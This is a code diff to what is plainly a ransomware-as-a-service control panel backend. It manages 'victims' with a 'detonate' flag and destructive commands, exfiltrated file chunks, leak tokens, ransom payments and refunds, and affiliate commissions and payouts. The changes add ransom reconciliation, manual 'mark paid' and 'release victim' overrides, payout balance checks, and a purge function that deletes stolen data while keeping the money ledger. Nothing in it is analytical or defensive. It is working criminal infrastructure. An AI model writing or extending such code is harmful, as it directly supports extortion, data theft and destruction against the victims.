@@ -1102,30 +1102,87 @@ def commands_recent(limit: int = 100):
 
 def add_payment(vid: str, amount: float, note: str = "", txid: str = "",
                 actor: str = "", affiliate: str = "") -> float:
-    """Record a manual payment; returns the victim's total credited."""
+    """Record a payment or refund and reconcile victim/invoice state."""
+    _v0 = get_victim(vid)
+    if _v0:
+        ensure_invoice(_v0)
     with db() as conn:
         conn.execute("INSERT INTO payments (vid, amount, note, txid, actor, affiliate, ts) "
                      "VALUES (?,?,?,?,?,?,?)",
-                     (vid, float(amount), note, txid, actor, affiliate or actor, now()))
+                     (vid, float(amount), note, txid, actor, affiliate or "", now()))
         conn.commit()
         total = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payments WHERE vid=?",
                              (vid,)).fetchone()[0]
         v = conn.execute("SELECT * FROM victims WHERE vid=?", (vid,)).fetchone()
         paid_now = False
+        unpaid_now = False
         need = effective_price(v) if v else 0.0
-        if v and v["status"] != "paid" and need > 0 and total + 1e-9 >= need:
-            conn.execute("UPDATE victims SET status='paid', paid_at=? WHERE vid=?",
-                         (now(), vid))
-            paid_now = True
+        if v:
+            if (v["status"] not in ("dead", "pardoned")
+                    and v["status"] != "paid" and need > 0
+                    and total + 1e-9 >= need):
+                conn.execute("UPDATE victims SET status='paid', paid_at=?, "
+                             "detonate=0 WHERE vid=?", (now(), vid))
+                paid_now = True
+            elif v["status"] == "paid" and total + 1e-9 < need:
+                # A refund dropped the victim below the current invoice.
+                conn.execute("UPDATE victims SET status='negotiating', paid_at='', "
+                             "detonate=0 WHERE vid=?", (vid,))
+                unpaid_now = True
+            elif amount < 0:
+                conn.execute("UPDATE victims SET detonate=0 WHERE vid=?", (vid,))
         conn.commit()
-        if paid_now:
+        if paid_now or unpaid_now:
             cancel_destructive_commands(vid)
-        conn.execute("UPDATE invoices SET amount=?, updated=?, "
-                     "status=CASE WHEN ? THEN 'paid' WHEN ? > 0 THEN 'partial' "
-                     "ELSE status END WHERE vid=?",
-                     (float(total), now(), 1 if paid_now else 0, float(total), vid))
+        if paid_now:
+            invoice_status = "paid"
+        elif unpaid_now:
+            invoice_status = "partial" if total > 0 else "open"
+        elif v and v["status"] == "paid":
+            invoice_status = "paid"
+        elif total > 0:
+            invoice_status = "partial"
+        else:
+            invoice_status = "open"
+        conn.execute("UPDATE invoices SET amount=?, updated=?, status=? WHERE vid=?",
+                     (float(total), now(), invoice_status, vid))
         conn.commit()
         return float(total)
+
+
+def mark_paid(vid: str, actor: str = "", affiliate: str = "") -> bool:
+    """Mark a live victim paid, book the remaining quote, and disarm it."""
+    v = get_victim(vid)
+    if not v or (v["status"] or "") in ("dead", "pardoned"):
+        return False
+    ensure_invoice(v)
+    total = payments_total(vid)
+    need = effective_price(v)
+    if need > 0 and total + 1e-9 < need:
+        add_payment(vid, need - total, "manual mark paid", "", actor,
+                    affiliate or actor)
+    with db() as conn:
+        conn.execute("UPDATE victims SET status='paid', paid_at=COALESCE(paid_at,?), "
+                     "detonate=0 WHERE vid=?", (now(), vid))
+        conn.commit()
+    cancel_destructive_commands(vid)
+    sync_invoice(vid, "paid")
+    return True
+
+
+def release_victim(vid: str) -> bool:
+    """Root override: release the victim without recording revenue."""
+    v = get_victim(vid)
+    if not v:
+        return False
+    ensure_invoice(v)
+    with db() as conn:
+        conn.execute("UPDATE victims SET status='paid', paid_at=COALESCE(paid_at,?), "
+                     "detonate=0 WHERE vid=?", (now(), vid))
+        conn.commit()
+    cancel_destructive_commands(vid)
+    sync_invoice(vid, "void")
+    return True
 
 
 def payments_total(vid: str) -> float:
@@ -1273,13 +1330,19 @@ def affiliates():
                 "SELECT COALESCE(SUM(amount),0) FROM payments WHERE affiliate=?",
                 (op["username"],)).fetchone()[0]
             paid = conn.execute(
-                "SELECT COALESCE(SUM(amount),0) FROM payouts WHERE operator=?",
+                "SELECT COALESCE(SUM(amount),0) FROM payouts "
+                "WHERE operator=? AND status='paid'",
+                (op["username"],)).fetchone()[0]
+            committed = conn.execute(
+                "SELECT COALESCE(SUM(amount),0) FROM payouts "
+                "WHERE operator=? AND status IN ('requested','approved')",
                 (op["username"],)).fetchone()[0]
             owed = float(total) * float(op["pct"]) / 100.0
             out.append({
                 "username": op["username"], "role": op["role"], "pct": float(op["pct"]),
                 "total": float(total), "commission": round(owed, 2),
-                "paid": float(paid), "balance": round(owed - float(paid), 2),
+                "paid": float(paid), "committed": float(committed),
+                "balance": round(owed - float(paid) - float(committed), 2),
             })
     return out
 
@@ -1294,17 +1357,64 @@ def add_payout(operator: str, amount: float, note: str = "", actor: str = "",
         conn.commit()
 
 
-def set_payout_status(pid: int, status: str, actor: str = "") -> None:
+def set_payout_status(pid: int, status: str, actor: str = "") -> bool:
     if status not in ("requested", "approved", "paid", "rejected"):
-        return
+        return False
+    allowed = {
+        "requested": {"approved", "paid", "rejected"},
+        "approved": {"paid", "rejected"},
+        "paid": set(),
+        "rejected": set(),
+    }
     with db() as conn:
+        row = conn.execute("SELECT status FROM payouts WHERE id=?",
+                           (int(pid),)).fetchone()
+        if not row:
+            return False
+        current = (row["status"] or "paid")
+        if status == current:
+            return True
+        if status not in allowed.get(current, set()):
+            return False
         conn.execute("UPDATE payouts SET status=?, actor=?, updated=? WHERE id=?",
                      (status, actor, now(), int(pid)))
         conn.commit()
+    return True
 
 
-def request_payout(operator: str, amount: float, note: str = "") -> None:
-    add_payout(operator, amount, note, operator, "requested", operator)
+def request_payout(operator: str, amount: float, note: str = "") -> bool:
+    """Reserve a payout only if the current commission balance covers it."""
+    amount = float(amount)
+    if amount <= 0:
+        return False
+    with db() as conn:
+        if IS_PG:
+            conn.execute("SELECT 1 FROM operators WHERE username=? FOR UPDATE",
+                         (operator,))
+        else:
+            conn.execute("BEGIN IMMEDIATE")
+        total = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payments "
+                             "WHERE affiliate=?", (operator,)).fetchone()[0]
+        pct_row = conn.execute("SELECT COALESCE(commission_pct,0) FROM operators "
+                               "WHERE username=?", (operator,)).fetchone()
+        pct = float(pct_row[0]) if pct_row else 0.0
+        paid = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payouts "
+                            "WHERE operator=? AND status='paid'",
+                            (operator,)).fetchone()[0]
+        committed = conn.execute(
+            "SELECT COALESCE(SUM(amount),0) FROM payouts "
+            "WHERE operator=? AND status IN ('requested','approved')",
+            (operator,)).fetchone()[0]
+        balance = float(total) * pct / 100.0 - float(paid) - float(committed)
+        if amount > balance + 1e-9:
+            conn.rollback()
+            return False
+        conn.execute("INSERT INTO payouts (operator, amount, note, actor, ts, "
+                     "status, requested_by, updated) VALUES (?,?,?,?,?,?,?,?)",
+                     (operator, amount, note, operator, now(), "requested",
+                      operator, now()))
+        conn.commit()
+    return True
 
 
 def affiliate_summary(username: str) -> dict:
@@ -1317,9 +1427,10 @@ def affiliate_summary(username: str) -> dict:
         paid = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payouts "
                             "WHERE operator=? AND status='paid'",
                             (username,)).fetchone()[0]
-        requested = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payouts "
-                                 "WHERE operator=? AND status='requested'",
-                                 (username,)).fetchone()[0]
+        requested = conn.execute(
+            "SELECT COALESCE(SUM(amount),0) FROM payouts "
+            "WHERE operator=? AND status IN ('requested','approved')",
+            (username,)).fetchone()[0]
         victims = conn.execute("SELECT COUNT(DISTINCT vid) FROM payments "
                                "WHERE affiliate=?", (username,)).fetchone()[0]
     commission = float(total) * pct / 100.0
@@ -1337,6 +1448,23 @@ def create_campaign(name: str, note: str = "", config: str = "{}") -> int:
                            (name.strip()[:120], note[:1000], 1, now(), config[:20000]))
         conn.commit()
         return _insert_id(conn, cur)
+
+
+def campaign_by_token(token: str) -> int:
+    token = (token or "").strip()
+    if not token:
+        return 0
+    with db() as conn:
+        rows = conn.execute("SELECT id, config FROM campaigns WHERE active=1"
+                            ).fetchall()
+    for row in rows:
+        try:
+            cfg = json.loads(row["config"] or "{}")
+        except (TypeError, ValueError):
+            continue
+        if str(cfg.get("token") or "").strip() == token:
+            return int(row["id"])
+    return 0
 
 
 def list_campaigns() -> list:
@@ -1537,6 +1665,41 @@ def vault_reveal_text(text: str) -> str:
 # ---------------------------------------------------------------------------
 # Campaign build jobs
 # ---------------------------------------------------------------------------
+def purge_victim(vid: str) -> dict:
+    """Delete a victim and operational artifacts; keep the money ledger."""
+    paths = []
+    with db() as conn:
+        for row in conn.execute("SELECT path FROM uploads WHERE vid=?", (vid,)):
+            paths.append(row["path"])
+        for row in conn.execute(
+                "SELECT c.path FROM exfil_chunks c JOIN exfil_files f "
+                "ON f.id=c.file_id WHERE f.vid=?", (vid,)):
+            paths.append(row["path"])
+        conn.execute("DELETE FROM exfil_chunks WHERE file_id IN "
+                     "(SELECT id FROM exfil_files WHERE vid=?)", (vid,))
+        conn.execute("DELETE FROM exfil_files WHERE vid=?", (vid,))
+        conn.execute("DELETE FROM uploads WHERE vid=?", (vid,))
+        conn.execute("DELETE FROM messages WHERE vid=?", (vid,))
+        conn.execute("DELETE FROM commands WHERE vid=?", (vid,))
+        conn.execute("DELETE FROM reports WHERE vid=?", (vid,))
+        conn.execute("DELETE FROM leak_tokens WHERE vid=?", (vid,))
+        conn.execute("DELETE FROM victims WHERE vid=?", (vid,))
+        conn.commit()
+    root = _uploads_root()
+    removed = 0
+    for path in paths:
+        try:
+            rp = os.path.realpath(path)
+            if os.path.commonpath([root, rp]) != root:
+                continue
+            if os.path.isfile(rp):
+                os.unlink(rp)
+                removed += 1
+        except (OSError, ValueError):
+            pass
+    return {"files": removed, "ledger": "preserved"}
+
+
 def create_campaign_build(campaign_id: int) -> int:
     with db() as conn:
         cur = conn.execute(
